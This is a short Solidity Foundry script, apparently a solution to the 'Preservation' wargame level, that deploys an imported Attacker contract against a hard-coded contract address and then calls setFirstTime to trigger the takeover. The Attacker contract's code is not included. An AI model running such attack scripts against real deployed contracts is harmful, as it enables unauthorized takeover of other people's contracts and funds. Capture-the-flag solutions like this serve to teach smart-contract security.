// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/Preservation/Attacker.sol";
import "src/Preservation/Preservation.sol";

contract PreservationScript is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Attacker attacker = new Attacker(0x395ef527e8b2C97b51742183612F050487b343FA);
        Preservation preservation = Preservation(0x395ef527e8b2C97b51742183612F050487b343FA);
        attacker.attack();
        preservation.setFirstTime(1674752216);
    }
}
